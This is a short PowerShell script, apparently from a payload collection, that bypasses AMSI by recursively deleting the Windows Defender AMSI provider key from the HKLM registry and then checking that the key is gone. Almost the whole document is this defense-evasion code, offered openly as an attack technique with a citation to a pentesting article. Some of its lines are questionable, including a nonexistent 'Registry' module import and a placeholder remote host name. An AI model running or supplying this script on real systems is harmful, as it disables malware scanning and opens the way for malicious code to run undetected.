
#Reference : https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/
#Author: payloads45

# Import the registry module
Import-Module -Name Registry

# Load the registry hive
$registryHive = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', 'ComputerName')

# Open the registry key that you want to remove
$registryKey = $registryHive.OpenSubKey('Software\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}', $true)

# Check whether the registry key exists
if ($registryKey -ne $null)
{
    # Delete the registry key and all its subkeys
    Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
}

# Enumerate the registry keys in the AMSI Providers registry key
$registryKey = $registryHive.OpenSubKey('Software\Microsoft\AMSI\Providers')
$registryKeys = $registryKey.GetSubKeyNames()

# Check whether the registry key has been removed
if (-not $registryKeys.Contains('{2781761E-28E0-4109-99FE-B9D127C57AFE}'))
{
    # Print a message indicating that the registry key has been removed
    Write-Output "The registry key has been removed"
}
else
{
    # Print a message indicating that the registry key still exists
    Write-Output "The registry key still exists"
}
